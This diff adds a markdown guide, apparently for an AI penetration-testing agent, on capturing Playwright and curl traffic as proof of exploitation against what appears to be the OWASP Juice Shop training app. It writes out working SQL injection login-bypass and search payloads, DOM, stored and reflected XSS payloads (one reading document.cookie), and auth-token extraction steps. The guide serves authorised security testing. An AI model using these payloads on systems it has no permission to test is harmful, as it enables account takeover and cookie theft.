@@ -1,0 +1,105 @@
+# Network Interception — Playwright Traffic Capture
+
+Use Playwright's network interception to capture request/response pairs as proof of exploitation. This is critical for evidence gathering — screenshots alone are not sufficient.
+
+---
+
+## Capturing Login Token
+
+After navigating to `{{TARGET_URL}}/#/login` and submitting credentials, capture the auth token from the response:
+
+```
+1. browser_navigate("{{TARGET_URL}}/#/login")
+2. [dismiss banners, fill form, click login]
+3. browser_network_requests()
+   → Look for a request to /rest/user/login with status 200
+   → The response body contains {"authentication": {"token": "eyJ..."}}
+4. Extract the token value
+```
+
+### Alternative — Extract from localStorage after login:
+```javascript
+browser_evaluate("localStorage.getItem('token')")
+```
+
+---
+
+## Capturing Request/Response for Injection Proof
+
+When testing an injection payload, capture the full HTTP exchange:
+
+### GET Request Interception
+```
+1. browser_navigate("{{TARGET_URL}}/rest/products/search?q=' OR 1=1--")
+2. browser_network_requests()
+   → Find the request to /rest/products/search
+   → Record: URL, status code, response body (JSON)
+3. Compare response size/content to a baseline request:
+   browser_navigate("{{TARGET_URL}}/rest/products/search?q=normalterm")
+   browser_network_requests()
+```
+
+### POST Request Interception
+```
+1. Use curl for POST requests (more reliable than Playwright for API calls):
+   curl -v -X POST "{{TARGET_URL}}/rest/user/login" \
+     -H "Content-Type: application/json" \
+     -d '{"email":"' OR 1=1--","password":"x"}'
+2. Capture the full response including headers and body.
+```
+
+---
+
+## Capturing XSS Evidence
+
+### DOM-Based XSS
+```
+1. browser_navigate("{{TARGET_URL}}/#/search?q=<script>alert('xss')</script>")
+2. Check for dialog events — Playwright auto-captures alert/confirm/prompt dialogs
+3. Also check DOM:
+   browser_evaluate("document.querySelector('.search-results')?.innerHTML")
+   → If the payload is embedded unsanitized, this is proof of XSS
+```
+
+### Stored XSS
+```
+1. Submit malicious content via API:
+   curl -X POST "{{TARGET_URL}}/api/Feedbacks" \
+     -H "Content-Type: application/json" \
+     -H "Authorization: Bearer <TOKEN>" \
+     -d '{"comment":"<script>alert(document.cookie)</script>","rating":5}'
+2. Navigate to the page where the content is rendered:
+   browser_navigate("{{TARGET_URL}}/#/administration")
+3. Check for dialog events or query the DOM:
+   browser_evaluate("document.querySelector('.feedback-comment')?.innerHTML")
+```
+
+### Reflected XSS
+```
+1. browser_navigate("{{TARGET_URL}}/#/track-result?id=<iframe src='javascript:alert(1)'>")
+2. Check for dialog events
+3. Screenshot as supplementary evidence:
+   browser_screenshot()
+```
+
+---
+
+## Traffic Baseline Pattern
+
+Establish baselines BEFORE injecting payloads so you can prove a difference:
+
+| Endpoint | Normal Input | Normal Response | Injected Input | Injected Response |
+|----------|-------------|-----------------|----------------|-------------------|
+| `/rest/products/search?q=` | `apple` | 1-3 products, 200 OK | `' OR 1=1--` | 30+ products, 200 OK |
+| `/rest/user/login` | valid creds | JWT token, 200 OK | `' OR 1=1--` in email | JWT or error |
+
+The delta between normal and injected responses IS the proof. Always show both.
+
+---
+
+## Common Pitfalls
+
+1. **Angular SPA routing**: URLs with `/#/` are client-side routes. The network request goes to the base URL; the fragment is handled by Angular. For server-side endpoints (`/rest/*`, `/api/*`), use curl or direct browser navigation.
+2. **CORS headers**: Browser-based requests may be blocked by CORS. Use curl for cross-origin API calls.
+3. **Response truncation**: Large JSON responses should be truncated to the relevant portion (first 20 items, key fields only).
+4. **Timing**: Wait for Angular to finish rendering before capturing DOM state. A 1-second delay or polling for element presence is recommended.
